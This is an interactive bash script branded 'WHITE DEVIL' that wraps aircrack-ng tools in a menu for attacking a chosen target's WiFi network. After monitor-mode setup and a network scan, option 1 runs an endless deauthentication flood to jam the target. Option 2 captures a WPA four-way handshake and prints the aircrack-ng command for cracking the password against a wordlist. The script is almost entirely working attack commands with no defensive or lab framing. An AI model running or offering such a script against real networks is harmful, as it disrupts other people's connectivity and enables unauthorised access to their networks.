RED="\e[31m"
ORANGE="\e[33m"
BLUE="\e[94m"
GREEN="\e[92m"
STOP="\e[0m"
#-----
#install air package
sudo apt-get install aircrack-ng
sudo apt-get install figlet
clear
# LOGIN SCREEN MESSAGE 
printf "${GREEN}"
printf "=================================\n"
printf "${ORANGE}"
figlet -w 200 -f standard "WHITE          DEVIL"
printf "${BLUE}"
figlet -w 200 -f  big ".                 ..    GS    ..              ."
printf "${GREEN}"
printf "=================================\n"
printf "${STOP}"
#-----


echo "Input Your Wifi Name--> 
      [You will find it in the terminal after executing the command ##iwconfig##]" 
read name
echo "Turning You To Monitor-Mode..............."
airmon-ng start $name

echo "Input Your WIFI Name after Monitor Mode---> 
      [You will find it in the same place as Before]"
read monname 
airmon-ng check kill
echo "Press....crtl+c After getting Your Target's MAC-ID or BSSID"
echo "....."
sleep 3
data= airodump-ng $monname
sleep 2
clear
echo "[Enter Your Target's BSSID or MAC-ID]"
echo "NOTE: Your Target PWR Should be Less Than 75"
read bssid
echo "Processing............................."
sleep 3
echo "  "
echo "[Enter Your Target's Channel --> ]"
read channel
echo "Input File's Name to save its cap file"
read fname
echo "  "
clear
echo "Select The Attack.. "
echo "[1] -- Jammer"
echo "[2] -- Password-Cracker"
read attack
sleep 2
clear
if [ $attack = '1' ]; then
    echo "GS Weapon is Loading to fire the Packets................"
    aireplay-ng --deauth 0 -a $bssid $monname
else 
    clear
    printf "${GREEN}"
    printf "=================================\n"
    printf "${ORANGE}"
    figlet -w 200 -f standard "WHITE          DEVIL"
    printf "${BLUE}"
    figlet -w 200 -f  big ".                 ..    GS    ..              ."
    printf "${GREEN}"
    printf "=================================\n"
    printf "${STOP}"
#-----
    printf "${GREEN}"
    printf "=================================\n"
    printf "${ORANGE}"
    figlet -w 200 -f standard "Thank You"
    printf "${BLUE}"
    figlet -w 200 -f  small "                           -Soppin"
    printf "${GREEN}"
    printf "=================================\n"
    printf "${STOP}"
    sudo airmon-ng stop $monname
    sudo bash reconsole.sh
fi 
if [ $attack = '2' ]; then
    echo " "
    echo "[NOTE: You need to open the other terminal and run ##aireplay-ng --deauth 0 -a bssid Your_Wifi_name## ]"
    echo "Later After Your execution of that command if u get the four  way handshake File Press ctrl+c"
    sleep 7
    clear
    sudo airodump-ng -w $fname --bssid $bssid -c $channel  $monname 
fi
clear
printf "${GREEN}"
printf "=================================\n"
printf "${ORANGE}"
figlet -w 200 -f standard "WHITE          DEVIL"
printf "${BLUE}"
figlet -w 200 -f  big ".                 ..    GS    ..              ."
printf "${GREEN}"
printf "=================================\n"
printf "${STOP}"
#-----
echo " "
echo "Use the Command to crack the password using the worldlist"
echo " ## aircrack-ng cap_file_name.cap -w Wordllist_path.txt##"
sleep 2
printf "${GREEN}"
printf "=================================\n"
printf "${ORANGE}"
figlet -w 200 -f standard "Thank You"
printf "${BLUE}"
figlet -w 200 -f  small "                           -Soppin"
printf "${GREEN}"
printf "=================================\n"
printf "${STOP}"
sudo airmon-ng stop $monname
sudo bash reconsole.sh
